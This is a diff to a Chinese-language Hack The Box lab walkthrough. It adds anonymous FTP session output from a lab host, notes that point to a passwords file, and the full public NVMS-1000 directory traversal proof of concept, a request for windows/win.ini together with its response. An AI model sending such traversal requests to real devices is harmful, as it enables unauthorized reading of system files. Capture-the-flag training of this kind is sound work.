@@ -123,7 +123,7 @@ ftp> dir
 ftp> get "Nadine\\Confidential.exe
 local: Nadine\\Confidential.exe remote: Nadine\\Confidential.exe
 229 Entering Extended Passive Mode (|||49686|)
-550 The system cannot find the path specified. 
+550 The system cannot find the path specified.   //550 是错误
 
 ftp> exit
 221 Goodbye.
@@ -148,6 +148,84 @@ htb_vpn_logs.log  my_credentials.txt  my_data  README.license
 [★]$ cat Desktop/my_credentials.txt
 Username: syareya55
 Password: cqroAqyi
+```
+#### 对ftp的正确示范
+```
+[★]$ ftp 10.129.227.77
+Connected to 10.129.227.77.
+220 Microsoft FTP Service
+Name (10.129.227.77:root): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> ls
+229 Entering Extended Passive Mode (|||49685|)
+150 Opening ASCII mode data connection.
+02-28-22  06:35PM       <DIR>          Users
+226 Transfer complete.
+ftp> cd Users
+250 CWD command successful.
+ftp> ls
+229 Entering Extended Passive Mode (|||49686|)
+125 Data connection already open; Transfer starting.
+02-28-22  06:36PM       <DIR>          Nadine
+02-28-22  06:37PM       <DIR>          Nathan
+226 Transfer complete.
+
+ftp> ls Nadine
+229 Entering Extended Passive Mode (|||49687|)
+125 Data connection already open; Transfer starting.
+02-28-22  06:36PM                  168 Confidential.txt
+226 Transfer complete.
+ftp> get "Nadine\\Confidential.txt"
+local: Nadine\\Confidential.txt remote: Nadine\\Confidential.txt
+229 Entering Extended Passive Mode (|||49688|)
+150 Opening ASCII mode data connection.
+100% |***********************************|   168       18.74 KiB/s    00:00 ETA
+226 Transfer complete.
+WARNING! 6 bare linefeeds received in ASCII mode.
+File may not have transferred correctly.
+168 bytes received in 00:00 (18.31 KiB/s)
+
+ftp> ls Nathan
+229 Entering Extended Passive Mode (|||49689|)
+150 Opening ASCII mode data connection.
+02-28-22  06:36PM                  182 Notes to do.txt
+226 Transfer complete.
+ftp> get "Nathan\\Notes to do.txt"
+local: Nathan\\Notes to do.txt remote: Nathan\\Notes to do.txt
+229 Entering Extended Passive Mode (|||49690|)
+150 Opening ASCII mode data connection.
+100% |***********************************|   182       20.29 KiB/s    00:00 ETA
+226 Transfer complete.
+WARNING! 4 bare linefeeds received in ASCII mode.
+File may not have transferred correctly.
+182 bytes received in 00:00 (20.04 KiB/s)
+ftp> exit
+221 Goodbye.
+
+[★]$ ls
+ 47774.txt          Documents  'Nadine\\Confidential.txt'   Templates
+ cacert.der         Downloads  'Nathan\\Notes to do.txt'    Videos
+ Confidential.txt   Music       Pictures
+ Desktop            my_data     Public
+
+[★]$ cat 'Nadine\\Confidential.txt'
+Nathan,
+
+I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
+//我把你的密码.txt文件留在你桌面上了。请删除此编辑后，你自己，并把它放回安全文件夹。
+Regards
+
+Nadine
+
+[★]$ cat 'Nathan\\Notes to do.txt'
+1) Change the password for NVMS - Complete
+2) Lock down the NSClient Access - Complete
+3) Upload the passwords
+4) Remove public access to NVMS
+5) Place the secret files in SharePoint
 ```
 #### 在浏览器中检查80端口，可以看到NVMS-1000网络监控的登录页面软件。默认凭证admin / 123456或其他常见凭证不给我们访问。
 ```
@@ -218,5 +296,35 @@ NVMS 1000 - Directory Traversal               | hardware/webapps/47774.txt
 TVT NVMS 1000 - Directory Traversal           | hardware/webapps/48311.py
 ---------------------------------------------- ---------------------------------
 Shellcodes: No Results
+
+[★]$ searchsploit -m hardware/webapps/47774.txt
+[★]$ cat 47774.txt
+# Title: NVMS-1000 - Directory Traversal
+# Date: 2019-12-12
+# Author: Numan Türle
+# Vendor Homepage: http://en.tvt.net.cn/
+# Version : N/A
+# Software Link : http://en.tvt.net.cn/products/188.html
+
+POC
+---------
+
+GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
+Host: 12.0.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+Response
+---------
+
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
 ```
-#### 在阅读文本文件,它基本上是说我可以请求  /../../../../../../../../../../../../windows/win.ini和得到它。我会将请求发送到打嗝中继器，它会工作：
+
